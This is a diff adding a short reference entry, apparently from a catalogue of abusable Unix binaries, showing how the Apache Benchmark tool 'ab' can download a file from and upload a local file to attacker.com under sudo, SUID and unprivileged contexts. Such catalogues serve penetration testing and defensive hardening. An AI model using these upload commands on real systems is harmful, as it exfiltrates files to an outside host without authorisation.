@@ -1,0 +1,26 @@
+ab
+==
+
+Download
+--------
+
+[Sudo]
+    ab -v2 http://attacker.com/path/to/input-file
+
+[SUID]
+    ab -v2 http://attacker.com/path/to/input-file
+
+[Unprivileged]
+    ab -v2 http://attacker.com/path/to/input-file
+
+Upload
+------
+
+[Sudo]
+    ab -p /path/to/input-file http://attacker.com/
+
+[SUID]
+    ab -p /path/to/input-file http://attacker.com/
+
+[Unprivileged]
+    ab -p /path/to/input-file http://attacker.com/
